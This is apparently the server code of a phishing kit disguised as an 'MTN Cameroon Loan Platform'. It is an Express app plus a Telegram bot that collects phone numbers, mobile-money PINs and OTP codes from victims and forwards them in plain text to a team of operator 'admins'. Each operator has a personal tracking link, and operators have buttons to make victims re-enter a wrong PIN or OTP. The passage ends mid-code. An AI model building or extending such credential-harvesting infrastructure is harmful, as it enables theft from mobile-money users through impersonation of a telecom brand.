const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// CONFIGURATION & ENVIRONMENT
// ==========================================
const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Initialize Telegram Bot (Webhook mode)
const bot = new TelegramBot(BOT_TOKEN);

// In-memory tracking maps
const adminChatIds       = new Map(); // adminId → chatId
const pausedAdmins       = new Set(); // adminIds currently paused
const processingLocks    = new Set(); // duplicate submission lock
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;
let dbReady = false;

// ==========================================
// MIDDLEWARE (CORS & BODY PARSERS)
// ==========================================
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// DB Ready Guard for API routes
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ 
            success: false, 
            message: 'Database initialization in progress. Please try again shortly.' 
        });
    }
    next();
});

// ==========================================
// HELPER FUNCTIONS
// ==========================================
function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

function formatPhone(phoneNumber) {
    if (!phoneNumber) return '';
    let cleaned = phoneNumber.toString().replace(/\s+/g, '').replace(/[^0-9+]/g, '');
    if (cleaned.startsWith('+237')) return cleaned.slice(4);
    if (cleaned.startsWith('237'))  return cleaned.slice(3);
    return cleaned;
}

async function sendToAdmin(adminId, message, options = {}) {
    let chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID found for admin: ${adminId}`);
                return null;
            }
            chatId = admin.chatId;
            adminChatIds.set(adminId, chatId);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending message to ${adminId} (${chatId}):`, error.message);
        return null;
    }
}

function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages   = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE) || 1;
    const start        = page * SUSPEND_PAGE_SIZE;
    const pageAdmins   = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS (MTN CAMEROON)*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// TELEGRAM WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        if (req.body && req.body.update_id !== undefined) {
            bot.processUpdate(req.body);
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// LOAD ADMIN CHAT IDs
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ Loaded ${adminChatIds.size} active chat IDs (${pausedAdmins.size} paused).`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin        = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
💛 *Welcome ${admin ? admin.name : 'Admin'}!* (MTN MoMo Cameroon)

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your personal link
/stats - View your performance stats
/pending - View pending applications
/myinfo - View your profile info
`;
                if (isSuperAdmin) {
                    message += `
*Super Admin Management:*
/addadmin - Add new admin
/addadminid - Add admin with custom ID
/transferadmin oldChatId | newChatId - Transfer access
/pauseadmin <adminId> - Pause admin access
/unpauseadmin <adminId> - Restore admin access
/removeadmin <adminId> - Permanently delete admin
/admins - List all admins
/suspendall - Bulk suspend admin links

*Messaging:*
/send <adminId> <message> - Direct message an admin
/broadcast <message> - Message all active admins
/ask <adminId> <request> - Send an action request
`;
                }
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
💛 *Welcome to MTN Cameroon Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this Chat ID to your Super Admin to receive access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start command:', error);
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as an admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');
        
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR MTN CAMEROON LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Assigned Applications → *${admin ? admin.name : adminId}*
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as an admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');
        
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS (MTN CAMEROON)*

📋 Total Processed: ${stats.total || 0}
⏳ PIN Pending: ${stats.pinPending || 0}
✅ PIN Approved: ${stats.pinApproved || 0}
⏳ OTP Pending: ${stats.otpPending || 0}
🎉 Fully Approved: ${stats.fullyApproved || 0}
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as an admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');

        const adminApps  = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN Verification (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. +237 ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP Verification (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. +237 ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp || 'N/A'}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as an admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');
        
        const admin       = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';

        bot.sendMessage(chatId, `
ℹ️ *PROFILE INFORMATION*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 Created: ${new Date(admin.createdAt).toLocaleString()}
${statusEmoji} Status: ${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only Super Admin can perform this action.');
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Use format:
\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin Paul Biya|paul@example.cm|123456789\`
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only Super Admin can perform this action.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr, 10);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a valid integer.');

            const allAdmins       = await db.getAllAdmins();
            const existingNumbers = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''), 10)).filter(n => !isNaN(n));
            const nextNumber      = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId      = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED SUCCESSFULLY*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Link: ${WEBHOOK_URL}?admin=${newAdminId}
            `, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!* (MTN Cameroon)

Welcome ${name}!
*Your Admin ID:* \`${newAdminId}\`
*Your Link:* ${WEBHOOK_URL}?admin=${newAdminId}
                `, { parse_mode: 'Markdown' });
            } catch (notifyErr) {
                bot.sendMessage(chatId, '⚠️ Admin registered, but bot failed to send notification. (User must send /start first).');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin: ' + error.message);
        }
    });

    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) {
                return bot.sendMessage(chatId, '❌ Format: `/addadminid ADMINID|NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr, 10);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `✅ Admin \`${newAdminId}\` created successfully.`, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) return bot.sendMessage(chatId, '❌ Format: `/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });

            const oldChatId = parseInt(parts[0], 10);
            const newChatId = parseInt(parts[1], 10);

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });

            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `🔄 Admin \`${targetAdminId}\` transferred to Chat ID \`${newChatId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Transfer failed: ' + error.message);
        }
    });

    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');
        const target = match[1].trim();
        if (target === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot pause Super Admin.');
        
        pausedAdmins.add(target);
        await db.updateAdmin(target, { status: 'paused' });
        bot.sendMessage(chatId, `🚫 Admin \`${target}\` paused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');
        const target = match[1].trim();
        
        pausedAdmins.delete(target);
        await db.updateAdmin(target, { status: 'active' });
        bot.sendMessage(chatId, `✅ Admin \`${target}\` unpaused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');
        const target = match[1].trim();
        if (target === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot remove Super Admin.');
        
        await db.deleteAdmin(target);
        adminChatIds.delete(target);
        pausedAdmins.delete(target);
        bot.sendMessage(chatId, `🗑️ Admin \`${target}\` removed.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Access paused.');

        try {
            const allAdmins = await db.getAllAdmins();
            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuper  = admin.adminId === 'ADMIN001';
                const isPaused = pausedAdmins.has(admin.adminId);
                const status   = isSuper ? '⭐ Super' : isPaused ? '🚫 Paused' : '✅ Active';
                message += `${index+1}. ${status} *${admin.name}* (\`${admin.adminId}\`)\n`;
            });

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    bot.onText(/\/suspendall/, async (msg) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        try {
            const allAdmins     = await db.getAllAdmins();
            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

            if (regularAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No sub-admins found to suspend.');

            const selections = new Set(regularAdmins.map(a => a.adminId));
            suspendAllSessions.set(chatId, { page: 0, allAdmins: regularAdmins, selections });

            const session = suspendAllSessions.get(chatId);
            const { text, inline_keyboard } = buildSuspendAllPage(session);

            await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        const input = match[1].trim();
        const spaceIndex = input.indexOf(' ');
        if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Usage: \`/send ADMINID Your message\``, { parse_mode: 'Markdown' });
        
        const targetAdminId = input.substring(0, spaceIndex).trim();
        const messageText   = input.substring(spaceIndex + 1).trim();

        const sent = await sendToAdmin(targetAdminId, `📨 *SUPER ADMIN:* ${messageText}`, { parse_mode: 'Markdown' });
        if (sent) bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        else bot.sendMessage(chatId, `❌ Could not send message to \`${targetAdminId}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        const messageText = match[1].trim();
        const allAdmins   = await db.getAllAdmins();
        const targets     = allAdmins.filter(a => a.adminId !== 'ADMIN001');

        let success = 0;
        for (const admin of targets) {
            if (adminChatIds.has(admin.adminId)) {
                const sent = await sendToAdmin(admin.adminId, `📢 *BROADCAST:* ${messageText}`, { parse_mode: 'Markdown' });
                if (sent) success++;
            }
        }
        bot.sendMessage(chatId, `📢 Broadcast complete: Delivered to ${success}/${targets.length} admins.`);
    });

    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Super Admin command only.');

        const input = match[1].trim();
        const spaceIndex = input.indexOf(' ');
        if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Usage: \`/ask ADMINID Request details\``, { parse_mode: 'Markdown' });

        const targetAdminId = input.substring(0, spaceIndex).trim();
        const requestText   = input.substring(spaceIndex + 1).trim();
        const requestId     = `REQ-${Date.now()}`;

        if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Target admin is not connected.`);

        await bot.sendMessage(adminChatIds.get(targetAdminId), `
❓ *ACTION REQUEST FROM SUPER ADMIN*

${requestText}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
                    { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
                ]]
            }
        });
        bot.sendMessage(chatId, `✅ Request dispatched to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
    });
}

// ==========================================
// TELEGRAM CALLBACK QUERY HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized user.', show_alert: true });
    }

    if (data === 'sall_noop') return bot.answerCallbackQuery(callbackQuery.id, { text: '' });

    // Handle Bulk Suspension Modal Callbacks
    if (data.startsWith('sall_toggle_') || data.startsWith('sall_page_') || data === 'sall_cancel' || data === 'sall_confirm') {
        if (adminId !== 'ADMIN001') return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Super Admin only.' });
        const session = suspendAllSessions.get(chatId);
        if (!session) return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired.' });

        if (data.startsWith('sall_toggle_')) {
            const target = data.replace('sall_toggle_', '');
            if (session.selections.has(target)) session.selections.delete(target);
            else session.selections.add(target);
        } else if (data.startsWith('sall_page_')) {
            session.page = parseInt(data.replace('sall_page_', ''), 10);
        } else if (data === 'sall_cancel') {
            suspendAllSessions.delete(chatId);
            try { await bot.editMessageText('❌ Bulk suspension cancelled.', { chat_id: chatId, message_id: messageId }); } catch (e) {}
            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Cancelled' });
        } else if (data === 'sall_confirm') {
            const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
            for (const admin of toSuspend) {
                pausedAdmins.add(admin.adminId);
                await db.updateAdmin(admin.adminId, { status: 'paused' });
            }
            suspendAllSessions.delete(chatId);
            try { await bot.editMessageText(`🔒 Suspended ${toSuspend.length} admin links.`, { chat_id: chatId, message_id: messageId }); } catch (e) {}
            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Done' });
        }

        const { text, inline_keyboard } = buildSuspendAllPage(session);
        try {
            await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
        } catch (e) {}
        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Admin access paused.', show_alert: true });
    }

    // Handle Admin Request Responses
    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
        const parts = data.split('_');
        const action = parts[1];
        const reqId = parts[2];
        const respAdminId = parts[3];
        const superChat = adminChatIds.get('ADMIN001');

        if (superChat) {
            await bot.sendMessage(superChat, `📋 Response for ${reqId} by \`${respAdminId}\`: *${action.toUpperCase()}*`, { parse_mode: 'Markdown' });
        }

        try {
            await bot.editMessageText(`✅ Response logged: ${action.toUpperCase()}`, { chat_id: chatId, message_id: messageId });
        } catch (e) {}
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Submitted' });
    }

    // Handle Application Review Actions
    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data format.', show_alert: true });
    }

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId && adminId !== 'ADMIN001') {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application assigned to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found!', show_alert: true });
    }

    try {
        if (action === 'wrongpin' && type === 'otp') {
            await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp', pinStatus: 'rejected' });
            await bot.editMessageText(`❌ *WRONG PIN AT OTP STAGE*\n\nApp ID: \`${applicationId}\`\nUser requested to re-enter PIN.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Prompted user for correct PIN' });
        } 
        else if (action === 'wrongcode' && type === 'otp') {
            await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
            await bot.editMessageText(`❌ *WRONG OTP CODE*\n\nApp ID: \`${applicationId}\`\nUser requested to re-enter OTP.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Prompted user for correct OTP' });
        } 
        else if (action === 'deny' && type === 'pin') {
            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
            await bot.editMessageText(`❌ *PIN/SMS REJECTED*\n\nApp ID: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'PIN Rejected' });
        } 
        else if (action === 'allow' && type === 'pin') {
            await db.updateApplication(applicationId, { pinStatus: 'approved' });
            await bot.editMessageText(`✅ *PIN/SMS APPROVED*\n\nApp ID: \`${applicationId}\`\nUser directed to OTP step.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'PIN Approved' });
        } 
        else if (action === 'approve' && type === 'otp') {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            await bot.editMessageText(`🎉 *LOAN FULLY APPROVED!*\n\nApp ID: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Loan Approved!' });
        }
    } catch (err) {
        console.error('❌ Error executing callback action:', err);
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Error processing action.' });
    }
});

// ==========================================
// FRONT-END REST API ENDPOINTS
// ==========================================

// POST /api/verify-pin OR /api/verify-sms OR /api/submit-sms
app.post(['/api/verify-pin', '/api/verify-sms', '/api/submit-sms'], async (req, res) => {
    let lockKey = null;
    try {
        const phoneNumber    = req.body.phoneNumber || req.body.phone || req.body.mobile;
        const pin            = req.body.pin || req.body.sms || req.body.code || req.body.input || req.body.text;
        const requestAdminId = req.body.adminId || req.body.admin;
        const assignmentType = req.body.assignmentType;
        const existingAppId  = req.body.applicationId || req.body.appId;

        if (!phoneNumber || !pin) {
            return res.status(400).json({ 
                success: false, 
                message: 'Phone number and PIN/SMS code are required.' 
            });
        }

        const formattedPhone = formatPhone(phoneNumber);
        lockKey = `pin_${formattedPhone}`;

        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Verification in progress. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 8000);

        let assignedAdmin;

        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);

            if (!assignedAdmin) {
                return res.status(400).json({ success: false, message: 'The link used is invalid.' });
            }
            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'This service link is temporarily inactive.' });
            }
        } else {
            const activeAdmins    = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No operators available at the moment. Please try again later.' });
            }
            
            const adminStats = await Promise.all(
                availableAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: (stats.pinPending || 0) + (stats.otpPending || 0) };
                })
            );
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
        }

        let applicationId = existingAppId;
        let isExisting = false;

        if (applicationId) {
            const existing = await db.getApplication(applicationId);
            if (existing) {
                isExisting = true;
                await db.updateApplication(applicationId, {
                    phoneNumber: formattedPhone,
                    pin,
                    pinStatus: 'pending',
                    otpStatus: 'pending'
                });
            }
        }

        if (!isExisting) {
            applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
            const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
            const thisAdminPast   = existingApps.filter(a => formatPhone(a.phoneNumber) === formattedPhone);
            const isReturningUser = thisAdminPast.length > 0;

            await db.saveApplication({
                id:             applicationId,
                adminId:        assignedAdmin.adminId,
                adminName:      assignedAdmin.name,
                phoneNumber:    formattedPhone,
                pin,
                pinStatus:      'pending',
                otpStatus:      'pending',
                assignmentType: assignmentType || 'auto',
                isReturningUser,
                previousCount:  thisAdminPast.length,
                timestamp:      new Date().toISOString()
            });
        }

        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
            } else {
                return res.status(503).json({ success: false, message: 'Assigned admin is currently offline.' });
            }
        }

        await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW VERIFICATION SUBMISSION (MTN CAMEROON)*

📋 App ID: \`${applicationId}\`
📞 Phone: \`+237 ${formattedPhone}\`
🔑 Input/PIN: \`${pin}\`
⏰ Time: ${new Date().toLocaleString()}

⚠️ *ACTION REQUIRED:*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
